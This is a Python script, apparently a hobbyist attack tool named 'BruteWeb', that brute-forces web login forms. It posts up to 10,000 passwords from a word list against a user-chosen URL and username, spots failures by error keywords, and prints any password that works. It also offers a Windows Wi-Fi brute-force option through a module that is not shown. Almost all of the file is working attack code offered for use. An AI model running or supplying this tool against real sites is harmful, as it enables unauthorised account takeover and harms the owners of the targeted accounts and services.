# Author : Hunter87
# Github : https://github.com/hunter87ff
# Insta  : https://instagram.com/im_hunter87
# Youtube: https://youtube.com/@hunter87
lgr='\033[1;32m' 
red='\033[0;31m' 
cyan='\033[36m' 
blue='\033[34m'
NC='\033[0m'

try:
	import os, sys, time, brutewf, threading, platform
	import requests as req
except ImportError: os.system("pip install -r requirements.txt")


banner = f"""{red}
  ____             _     __        __   _     
 | __ ) _ __ _   _| |_ __\ \      / /__| |__  
 |  _ \| '__| | | | __/ _ \ \ /\ / / _ \ '_ \ 
 | |_) | |  | |_| | ||  __/\ V  V /  __/ |_) |
 |____/|_|   \__,_|\__\___| \_/\_/ \___|_.__/ 
                                             
                          {lgr}-By Hunter87ff 
{NC}"""
print(banner)

dec = input("Enter web/wifi : ")

if dec.lower()=="web":
	def is_incorrect(res, ses:bool) -> bool:
		if ses==True and "window.location" in res:return False
		error = ["incorrect", "wrong", "invalid", "not found", "login", "failed"]
		for err in error:
			if err in res.lower():
				return True

	def crack(method, url, target, dest, passw, psw):
		count = 1
		ses = False
		for i in psw:
			data = {f"{target}":f"{dest}", f"{passw}":f"{i}", "login":"Login"}
			if method.lower()=="session":
				sess = req.Session()
				sess.post(url, data)
				res = sess.get(url).text
				ses = True
			else:
				res = req.post(url, data, timeout=1).text
			if is_incorrect(res, ses):
				print(f"{count}) Failed {i}")
			else:
				print(f"{lgr}Password Is : {i}{NC}")
				return True
			count += 1
	def web():
		url = input("Enter Url : ")
		method = input("Enter Method (eg: sesstion, post) : ")
		target = input("Target (eg: email, username): ")
		dest = input("Target destination (eg: hunter87, h87@hunter87.io): ")
		passw = input("Password parameter (eg: pass, psw, password) :")
		chunk = 10000
		load = f"""{red}Starting Attack : 
█████████████████████████████████████████████████\n"""
		for x in load:
			sys.stdout.write(x)
			sys.stdout.flush()
			time.sleep(0.02)
		with open("passwords.txt", "r") as f:
			passwords = f.read().split("\n")[0:chunk]
			t = threading.Thread(target=crack, args=(method, url, target, dest, passw, passwords,))
			t.start()
	web()

####WIFI####
if dec.lower()=="wifi":
	if "windows" not in platform.system().lower():
		print(f"{red}Wifi module only works on windows{NC}")
		sys.exit()
	brutewf.main()
